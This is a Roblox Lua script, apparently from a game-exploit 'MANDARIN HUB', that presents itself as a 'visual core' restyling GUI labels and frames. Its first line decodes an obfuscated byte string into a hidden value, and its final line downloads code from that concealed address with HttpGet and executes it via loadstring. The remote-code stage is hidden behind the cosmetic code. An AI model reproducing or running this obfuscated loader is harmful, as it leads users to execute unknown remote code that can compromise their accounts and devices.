
--[[ STAGE 2: VISUAL CORE ]]
local BY0s37kwa25SfQ="\229\244\243\242\250\014\000\015\213\195\216\166\220\222\162\180\243\181\132\129\206\150\130\103\218\191\170\183\146\070\157\156\107"local VeacIjzOLtxYDFI3=229 local t7jApZlUdT8d4PXP9=126 local KYD6VtnpiFm6yzu=1 local shTOv5AHbZxSUqKn=5 local JRo3mAwKuiRLpg1=21 local PTRRGXBFcYuzes=false local a_GwwFdnMHysA=bit32 and bit32.bxor if not a_GwwFdnMHysA then a_GwwFdnMHysA=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local VOfsLRPpyvSZy3RkXm={}for s_VKS4g8ZBH1R=1,#BY0s37kwa25SfQ do local lHCP8K0Wcxuk=string.byte(BY0s37kwa25SfQ,s_VKS4g8ZBH1R)local ii784H0DUUPN1xSkQWdvr=(t7jApZlUdT8d4PXP9+(s_VKS4g8ZBH1R*shTOv5AHbZxSUqKn)+JRo3mAwKuiRLpg1)%256 if KYD6VtnpiFm6yzu==0 then lHCP8K0Wcxuk=(lHCP8K0Wcxuk-ii784H0DUUPN1xSkQWdvr)%256 VOfsLRPpyvSZy3RkXm[s_VKS4g8ZBH1R]=string.char(a_GwwFdnMHysA(lHCP8K0Wcxuk,VeacIjzOLtxYDFI3))else lHCP8K0Wcxuk=a_GwwFdnMHysA(lHCP8K0Wcxuk,VeacIjzOLtxYDFI3)VOfsLRPpyvSZy3RkXm[s_VKS4g8ZBH1R]=string.char((lHCP8K0Wcxuk-ii784H0DUUPN1xSkQWdvr)%256)end end local VGrO947IbcRDh=table.concat(VOfsLRPpyvSZy3RkXm)if PTRRGXBFcYuzes then VGrO947IbcRDh=string.reverse(VGrO947IbcRDh)end local pB_oRGekA_4M=VGrO947IbcRDh
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(pB_oRGekA_4M))()
